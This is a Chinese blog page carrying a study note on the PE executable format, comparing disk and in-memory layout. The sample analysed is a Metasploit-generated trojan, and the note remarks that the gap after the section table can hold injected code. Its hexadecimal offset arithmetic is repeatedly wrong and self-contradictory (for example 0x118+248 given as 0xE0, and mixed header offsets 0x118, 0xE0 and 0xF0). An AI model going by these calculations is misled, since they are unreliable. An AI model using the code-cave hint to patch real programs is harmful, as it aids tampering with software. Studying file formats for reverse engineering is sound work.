<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="baidu-site-verification" content="L6Lm9d5Crl"/>
  
  
  
  
  <title>林中小屋</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="林中小屋">
<meta property="og:url" content="http://antipassion.github.io/index.html">
<meta property="og:site_name" content="林中小屋">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="Nayon|1163875625@qq.com">
<meta name="twitter:card" content="summary">
  
    <link rel="alternative" href="/atom.xml" title="林中小屋" type="application/atom+xml">
  
  
    <link rel="icon" href="/img/favicon.png">
  
  
  
<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
  
    
    
  
  
      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  
  <!-- 加载特效 -->
    <script src="/js/pace.js"></script>
    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
  <script>
      var yiliaConfig = {
          fancybox: true,
          animate: true,
          isHome: true,
          isPost: false,
          isArchive: false,
          isTag: false,
          isCategory: false,
          open_in_new: false
      }
  </script>
<meta name="generator" content="Hexo 5.4.0"></head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        
<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>

        <a href="/" class="profilepic">
            
            <img lazy-src="/img/avatar.png" class="js-avatar">
            
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/"></a></h1>
        </hgroup>
        
        
            <form>
                <input type="text" class="st-default-search-input search" id="local-search-input" placeholder="搜索一下" autocomplete="off">
            </form>
            <div id="local-search-result"></div>
        
        
            <script type="text/javascript">
                (function() {
                    'use strict';
                    function getMatchData(keyword, data) {
                        var matchData = [];
                        for(var i =0;i<data.length;i++){
                            if(data[i].title.toLowerCase().indexOf(keyword)>=0) 
                                matchData.push(data[i])
                        }
                        return matchData;
                    }
                    var $input = $('#local-search-input');
                    var $resultContent = $('#local-search-result');
                    $input.keyup(function(){
                        $.ajax({
                            url: '/search.json',
                            dataType: "json",
                            success: function( json ) {
                                var str='<ul class=\"search-result-list\">';                
                                var keyword = $input.val().trim().toLowerCase();
                                $resultContent.innerHTML = "";
                                if ($input.val().trim().length <= 0) {
                                    $resultContent.empty();
                                    $('#switch-area').show();
                                    return;
                                }
                                var results = getMatchData(keyword, json);
                                if(results.length === 0){
                                    $resultContent.empty();
                                    $('#switch-area').show();
                                    return;
                                } 
                                for(var i =0; i<results.length; i++){
                                    str += "<li><a href='"+ results[i].url +"' class='search-result-title'>"+ results[i].title +"</a></li>";
                                }
                                str += "</ul>";
                                $resultContent.empty();
                                $resultContent.append(str);
                                $('#switch-area').hide();
                            }
                        });
                    });
                })();
            </script>
        
        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                    </div>
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        <li>友情链接</li>
                        
                        
                    </ul>
                </div>
            </div>
        
        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a  href="/archives/">主页</a></li>
                        
                            <li><a  href="/archives/">所有文章</a></li>
                        
                            <li><a  href="/Nayon">author</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fl mailto"  target="_blank" href="/1163875625@qq.com" title="mailto">mailto</a>
                            
                        </ul>
                    </nav>
                </section>
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <a href="/tags/PE%E7%BB%93%E6%9E%84/" style="font-size: 20px;">PE结构</a> <a href="/tags/ctf/" style="font-size: 13.33px;">ctf</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 16.67px;">代码审计</a> <a href="/tags/%E5%85%8D%E6%9D%80/" style="font-size: 10px;">免杀</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 10px;">域渗透</a>
                    </div>
                </section>
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://fk0x075.github.io/">117</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://alikon.art/">Nagarita</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://0range-x.github.io/">0r@nge</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://txluck.github.io/">永安寺</a>
                    
                    </div>
                </section>
                
                
            </div>
        </div>
    </header>
</div>

    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页"></a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                
                    <img lazy-src="/img/avatar.png" class="js-avatar">
                
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页"></a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/archives/">主页</a></li>
                
                    <li><a href="/archives/">所有文章</a></li>
                
                    <li><a href="/Nayon">author</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                <div class="social">
                    
                        <a class="mailto" target="_blank" href="/1163875625@qq.com" title="mailto">mailto</a>
                    
                </div>
            </nav>
        </header>
    </div>
</nav>
      <div class="body-wrap">
  
    <article id="post-PE结构-PE文件的两种状态" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2021/11/16/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81/" class="article-date">
      <time datetime="2021-11-16T06:50:09.000Z" itemprop="datePublished">2021-11-16</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2021/11/16/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81/">PE结构-PE文件的两种状态</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>本文的是学习复现自吾爱破解dalao <a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1393291-1-1.html">lyl610abc</a>的PE文件解析系列，非本人原创，属于学习笔记(大佬yyds!)。</p>
<h3 id="PE文件的两种状态"><a href="#PE文件的两种状态" class="headerlink" title="PE文件的两种状态"></a>PE文件的两种状态</h3><p>PE文件处于磁盘中与处于内存中时，两者的结构会稍微发生改变。</p>
<p>一个PE文件可以分为两种状态:</p>
<p>运行态: 当一个PE文件被打开时，PE文件的相关数据将会被<code>装载</code>到内存中，根据文件对齐以及内存对齐中的区别，文件的大小以以及结构会发生相应的改变</p>
<p>非运行态: 当一个PE文件尚未运行时，其数据存储在<code>磁盘中</code>时的一种状态</p>
<p><strong>思维脑图</strong></p>
<p>  lyl610abc师傅太强了</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116145908655.png" alt="image-20211116145908655"></p>
<p><strong>PE文件整体结构表</strong></p>
<table>
<thead>
<tr>
<th>结构</th>
<th>对应C数据结构</th>
<th>默认占用空间大小（单位字节）</th>
</tr>
</thead>
<tbody><tr>
<td>DOS MZ头</td>
<td>_IMAGE_DOS_HEADER</td>
<td>64</td>
</tr>
<tr>
<td>DOS Stub</td>
<td>仅在MS-DOS系统下有效，不作研究</td>
<td>不固定</td>
</tr>
<tr>
<td>PE文件头</td>
<td>_IMAGE_NT_HEADERS</td>
<td>4+20+224=248 （标志+标准头+扩展头）</td>
</tr>
<tr>
<td>PE文件头标志</td>
<td>Signature</td>
<td>4</td>
</tr>
<tr>
<td>PE文件表头/标准PE头</td>
<td>_IMAGE_FILE_HEADER</td>
<td>20</td>
</tr>
<tr>
<td>PE文件表头可选部分/扩展PE头</td>
<td>_IMAGE_OPTIONAL_HEADER</td>
<td>224</td>
</tr>
<tr>
<td>块表/节表</td>
<td>_IMAGE_SECTION_HEADER</td>
<td>40</td>
</tr>
<tr>
<td>块/节</td>
<td>无</td>
<td>由块表/节表决定</td>
</tr>
</tbody></table>
<hr>
<h4 id="非运行态"><a href="#非运行态" class="headerlink" title="非运行态"></a>非运行态</h4><p>判断文件类型是否为PE格式文件</p>
<p>判断流程如下:</p>
<ul>
<li>判断前两个字节是否为4D 5A（MZ）</li>
<li>找到3Ch</li>
<li>根据3Ch位置的2字节大小数据跳转偏移至其中，查看是否为50 45 00 00(PE..)</li>
</ul>
<table>
<thead>
<tr>
<th>地址</th>
<th>长度（单位字节）</th>
<th>对应C的数据结构</th>
<th>说明</th>
<th>值</th>
<th>ASCII</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>2</td>
<td>_IMAGE_DOS_HEADER的第一个成员e_magic</td>
<td>DOS MZ头的第一个成员</td>
<td>4D 5A</td>
<td>MZ</td>
</tr>
<tr>
<td>3C</td>
<td>2</td>
<td>_IMAGE_DOS_HEADER的最后一个成员e_lfanew</td>
<td>指出PE头文件偏移位置</td>
<td>不定</td>
<td>不定</td>
</tr>
<tr>
<td>[3C]</td>
<td>4</td>
<td>Signature</td>
<td>PE文件头标志</td>
<td>50 45 00 00</td>
<td>PE..</td>
</tr>
</tbody></table>
<p>利用msf生成的exe马进行实例分析</p>
<p>使用十六进制编辑器打开，判断文件格式类型</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116150624182.png" alt="image-20211116150624182"></p>
<p>可以看到，00处起始位置为4D 5A，表示DOS头开头；3Ch处位置是1801 表示PE头文件偏移位置；利用Ctrl+G跳转至118,可以看到标准PE头50 45,此文件可以判断为是PE文件</p>
<p>对应表格数据为</p>
<table>
<thead>
<tr>
<th>地址</th>
<th>说明</th>
<th>值</th>
<th>ASCII</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>DOS MZ头的第一个成员</td>
<td>4D 5A</td>
<td>MZ</td>
</tr>
<tr>
<td>3C</td>
<td>指出PE头文件偏移位置C</td>
<td>118</td>
<td></td>
</tr>
<tr>
<td>F0</td>
<td>PE文件头标志</td>
<td>50 45 00 00</td>
<td>PE..</td>
</tr>
</tbody></table>
<p>由此，我们可以发现以PE文件头标志为开始的PE头</p>
<p>根据PE结构可知，整个PE头是:<code>PE文件头标志+标准PE头+扩展PE头</code>的标准，长度大小为4+20+224=248字节</p>
<p>根据3Ch处的<code>118</code></p>
<p>后面所占的字节地址为:0x118+4+20+224=280+4+20+224=448=0xE0</p>
<p>由此可知整个PE头所占范围为0x118~0xE0</p>
<p><strong>PE文件头标志和标准PE头:</strong></p>
<p>​    0x118+2+20=200+24=0x130</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116170504766.png" alt="image-20211116170504766"></p>
<p><strong>扩展PE头</strong></p>
<p>根据先前得到的标准PE头结束后，紧挨着的224个字节便是扩展PE头所占空间</p>
<p>标准pe头结束位置:0x130</p>
<p>扩展PE头所占空间:224字节</p>
<p>所以扩展PE头所占区域为: 0x130+224=304+224=528=0x210</p>
<p>由此可知，自0xE0开始到0x1C0结束，都是扩展PE头位置</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116170637779.png" alt="image-20211116170637779"></p>
<p><strong>块表</strong></p>
<p>先前拿到的扩展PE头地址后16个字节为空字节，跳过，拿到第一个块表地址</p>
<p>从先前拿到的块表头地址继续往后看40个字节(块表大小) 拿到第二个块表的首地址</p>
<p>第一个块表头地址: 0x210</p>
<p>块表大小为 40字节</p>
<p>0x210+40 = 0x238</p>
<p>第一块表范围: 0x210~0x238</p>
<p>从0x238开始便是第二个块表</p>
<p>第一个块表: .text</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116170758247.png" alt="image-20211116170758247"></p>
<p>第二个块表: .rdata</p>
<p>0x238+0x28=0x260 ，块表范围为0x238~0x260</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116170913559.png" alt="image-20211116170913559"></p>
<p>第三个块表: .data</p>
<p>0x260+0x28=0x288,块表范围为0x260~0x288</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116170953884.png" alt="image-20211116170953884"></p>
<p>第四块表 .sxdata</p>
<p>0x288+0x28=0x2B0,块表范围为0x288~0x2B0</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116171048772.png" alt="image-20211116171048772"></p>
<p>第五块表 .rsrc</p>
<p>0x2B0+0x28=0x2D8,块表范围为0x2B0~0x2D8</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116171132556.png" alt="image-20211116171132556"></p>
<p>第六块表 .reloc</p>
<p>0x2D8+0x28=0x300,块表范围为0x2D8~0x300.</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116171308670.png" alt="image-20211116171308670"></p>
<p><strong>汇总块表</strong></p>
<table>
<thead>
<tr>
<th>块名称</th>
<th>块地址</th>
</tr>
</thead>
<tbody><tr>
<td>.text</td>
<td>0x210~0x238</td>
</tr>
<tr>
<td>.rdata</td>
<td>0x238~0x260</td>
</tr>
<tr>
<td>.data</td>
<td>0x260~0x288</td>
</tr>
<tr>
<td>.sxdata</td>
<td>0x288~0x2B0</td>
</tr>
<tr>
<td>.rsrc</td>
<td>0x2B0~0x2D8</td>
</tr>
<tr>
<td>.reloc</td>
<td>0x2D8~0x300</td>
</tr>
</tbody></table>
<p><strong>块表后的空隙</strong></p>
<p>块表后跟着的按理应该是块，但在块表后和块之前，多出了一段空间</p>
<p>此处为300~400</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116171539285.png" alt="image-20211116171539285"></p>
<p>存储时不存在空隙的，被称为<code>连续存储</code></p>
<p>但在<strong>块表以及块之间是可能存在空隙的</strong>，这个空隙里面一般被填充为编译器插入的数据（也可能不存在）</p>
<p>这段间隙的修改并不会导致程序的不可运行，因此可以拿来写入自己想要的代码来对程序进行修改</p>
<p><strong>为什么会存在这段间隙呢？</strong></p>
<ul>
<li>这段间隙是由于<strong>块表与块之间没有进行连续存储</strong></li>
<li>这段长度的存在与否以及长度，取决于块的<strong>起始位置</strong></li>
<li>而块的其实位置则根据<code>扩展PE头中的成员决定</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Standard fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    WORD    Magic;</span><br><span class="line">    BYTE    MajorLinkerVersion;</span><br><span class="line">    BYTE    MinorLinkerVersion;</span><br><span class="line">    DWORD   SizeOfCode;</span><br><span class="line">    DWORD   SizeOfInitializedData;</span><br><span class="line">    DWORD   SizeOfUninitializedData;</span><br><span class="line">    DWORD   AddressOfEntryPoint;</span><br><span class="line">    DWORD   BaseOfCode;</span><br><span class="line">    DWORD   BaseOfData;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// NT additional fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    DWORD   ImageBase;</span><br><span class="line">    DWORD   SectionAlignment;</span><br><span class="line">    DWORD   FileAlignment;</span><br><span class="line">    WORD    MajorOperatingSystemVersion;</span><br><span class="line">    WORD    MinorOperatingSystemVersion;</span><br><span class="line">    WORD    MajorImageVersion;</span><br><span class="line">    WORD    MinorImageVersion;</span><br><span class="line">    WORD    MajorSubsystemVersion;</span><br><span class="line">    WORD    MinorSubsystemVersion;</span><br><span class="line">    DWORD   Win32VersionValue;</span><br><span class="line">    DWORD   SizeOfImage;</span><br><span class="line">    DWORD   SizeOfHeaders;</span><br><span class="line">    DWORD   CheckSum;</span><br><span class="line">    WORD    Subsystem;</span><br><span class="line">    WORD    DllCharacteristics;</span><br><span class="line">    DWORD   SizeOfStackReserve;</span><br><span class="line">    DWORD   SizeOfStackCommit;</span><br><span class="line">    DWORD   SizeOfHeapReserve;</span><br><span class="line">    DWORD   SizeOfHeapCommit;</span><br><span class="line">    DWORD   LoaderFlags;</span><br><span class="line">    DWORD   NumberOfRvaAndSizes;</span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>结构体中的SizeOfHeaders成员(DWORD类型占4个字节)</p>
<p>SizeOfHeaders的含义是<code>3个头按文件对齐后的大小</code>：（DOS头+PE头+块表）大小加起来后进行<code>文件对齐</code>后得到的大小</p>
<p>自DOS头开始至块表结束，<code>头大小和为0x248</code>，此处想要拿到SizeOfHeaders成员的值，需要了解<code>文件对齐</code>的概念并对其进行对齐处理。</p>
<p><strong>什么是文件对齐？</strong></p>
<p>文件对齐的标准通过扩展PE头中定义的<code>FileAlignment(DWORD类型 占4字节)</code></p>
<p>文件对齐的要求就是SizeOfHeaders必须为FileAlignment的<code>整数倍</code></p>
<p>通过以上概念，我们可以理解，由于扩展PE头FileAlignment成员的限制，要求SizeOfHeaders必须为它的整数倍（不足则填充）；要想知道文件对齐的标准是多少，我们需要拿到FileAlignment的值</p>
<p>由于前面已知扩展PE头开始地址为:0xE0</p>
<p>FileAlignment(DWORD 4字节)地址为:0xE0+36 = 0x104</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116164142391.png" alt="image-20211116164142391"></p>
<p>FileAlignment为 00 02 00 00 即为 0x200</p>
<p>前面拿到的头大小和为0x248，显然并不是0x200的整数倍</p>
<p>其整数倍，也就是SizeOfHeader的大小应为: (0x248/200+1)*200=400</p>
<p><strong>SizeOfHeaders大小</strong></p>
<p>再通过扩展PE头成员值的方式验证计算是否正确</p>
<p>先前拿到的FileAlignment地址为0x104，再往后24字节，便是SizeOfHeaders存放地址</p>
<p>0x104+24 = 0x11C</p>
<p>SizeOfHeaders：na</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116165632063.png" alt="image-20211116165632063"></p>
<p>拿到00 04 00 00 即 0x400,是FileAlignment的整数倍</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116164459021.png" alt="image-20211116164459021"></p>
<p>可以看到，块表与块之间的间隙自0x400结束</p>
<p><strong>为什么需要文件对齐？</strong></p>
<p>跟内存对齐一样，都是为了使执行时的效率更高，方便内存与磁盘进行交换数据更有效率。</p>
<p><strong>块结构</strong></p>
<p>块的起始地址由块表中的PointerToRawData决定，<code>第一个块</code>的起始地址则有上面的SizeofHeaders决定</p>
<p>块部分存储的是数据，如何存储由块表进行决定</p>
<p><strong>块表在C中的定义</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_SIZEOF_SHORT_NAME              8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">            DWORD   PhysicalAddress;</span><br><span class="line">            DWORD   VirtualSize;</span><br><span class="line">    &#125; Misc;</span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   SizeOfRawData;		<span class="comment">//块的大小</span></span><br><span class="line">    DWORD   PointerToRawData;	<span class="comment">//块在磁盘中的偏移</span></span><br><span class="line">    DWORD   PointerToRelocations;</span><br><span class="line">    DWORD   PointerToLinenumbers;</span><br><span class="line">    WORD    NumberOfRelocations;</span><br><span class="line">    WORD    NumberOfLinenumbers;</span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure>

<p><strong>块的起始地址</strong></p>
<p>找到结构体中的PointerToRawData成员（DWORD类型占4个字节)</p>
<p>PointerToRawData的含义为<code>该块在磁盘文件中的偏移</code></p>
<p>前面拿到第一个块表的首地址0x210</p>
<p>从0x210开始往后找20字节，0x210+20=0x224,拿到PointerToRawData的地址，跳转过去拿到4字节的值(磁盘文件中的偏移)</p>
<p>00 04 00 00 即 0x400<img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116172542500.png" alt="image-20211116172542500"></p>
<p>与SizeOfHeaders得到的一致，前面说过，块的起始地址由块表中的PointerToRawData决定，而第一个块的首地址由SizeOfHeaders决定，此处一致，验证了上文的说法。</p>
<p><strong>块的大小</strong></p>
<p>SizeOfRawData为块的大小(文件对齐后)</p>
<p>SizeOfRawData（Dword 4字节）就在PointerToRawData前面</p>
<p>所以其在块表中的地址为PointerToRawData-4=0x224-4=0x220</p>
<p>SizeOfRawData:</p>
<p>00 72 09 00 即为 0x97200</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116173302128.png" alt="image-20211116173302128"></p>
<p>块的大小与前面三个头(DOS+PE+块表)的大小一样，都需要满足文件对齐</p>
<p>先前拿到的FileAlignment为0x200 块的大小SizeOfRawData大小为0x97200满足整数倍条件，满足文件对齐。</p>
<p><strong>块的结束地址（下一个块的起始地址)</strong></p>
<p>块的结束地址为 块的起始地址+块的大小</p>
<p>即 0x400+0x97200 = 0x97600</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116173621872.png" alt="image-20211116173621872"></p>
<p>可以看到，第一个块与第二个块之间<code>存在空隙</code>,这段空隙是由于在文件中补足文件对齐产生的。</p>
<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>在非运行态下:</p>
<ul>
<li>DOS首部和PE文件头与块表连续存储，中间没有空隙</li>
<li>块表与块之间存在<code>文件对齐</code>的影响，可能会存在间隙</li>
<li>块与块之间也可能由于<code>文件对其</code>的影响产生间隙</li>
</ul>
<p><strong>相关数据结构成员</strong></p>
<table>
<thead>
<tr>
<th>数据结构成员</th>
<th>所属数据结构</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>SizeOfHeaders</td>
<td>扩展PE头</td>
<td>头大小（文件对齐后）</td>
</tr>
<tr>
<td>FileAlignment</td>
<td>扩展PE头</td>
<td>文件对齐</td>
</tr>
<tr>
<td>PointerToRawData</td>
<td>块表</td>
<td>第一个块表的PointerToRawData由SizeOfHeaders决定，后面块表的PointerToRawData由前一个块表的PointerToRawData+SizeOfRawData决定</td>
</tr>
<tr>
<td>SizeOfRawData</td>
<td>块表</td>
<td>块表的大小（文件对齐后）</td>
</tr>
</tbody></table>
<p><strong>记录下各个结构的起始以及结束位置方便接下来与运行态比较</strong></p>
<table>
<thead>
<tr>
<th>结构</th>
<th>起始地址</th>
<th>结束地址</th>
<th>大小</th>
</tr>
</thead>
<tbody><tr>
<td>DOS部首</td>
<td>0</td>
<td>118</td>
<td>0x118=280</td>
</tr>
<tr>
<td>PE文件头</td>
<td>118</td>
<td>210</td>
<td>0xF8=248=4+20+224</td>
</tr>
<tr>
<td>块表</td>
<td>210</td>
<td>300</td>
<td>0xF0=240=6*40</td>
</tr>
<tr>
<td>前三个结构</td>
<td>0</td>
<td>400</td>
<td>0x400（文件对齐后）</td>
</tr>
<tr>
<td>第一个块</td>
<td>400</td>
<td>97600</td>
<td>0x97200（文件对齐后）</td>
</tr>
</tbody></table>
<h4 id="运行态"><a href="#运行态" class="headerlink" title="运行态"></a>运行态</h4><p>运行态，指PE文件装载入内存时，PE结构文件的状态</p>
<p><strong>加载运行态PE文件</strong></p>
<p>1.启动PE文件</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116192050095.png" alt="image-20211116192050095"></p>
<p>2.使用16进制编辑器 工具-&gt;打开主内存-&gt;选定PE程序</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116192222818.png" alt="image-20211116192222818"></p>
<p><strong>分析运行态的PE文件</strong></p>
<p>此时Dos头的偏移起始地址为00820000,结束地址为008200F0</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116192334866.png" alt="image-20211116192334866"></p>
<p>跟进偏移，到达PE头标志起始地址008200F0,可见头标志起始地址和标准PE头 </p>
<p><strong>PE头标志和标准头</strong></p>
<p>起始为008200F0 </p>
<p>结束为00820108</p>
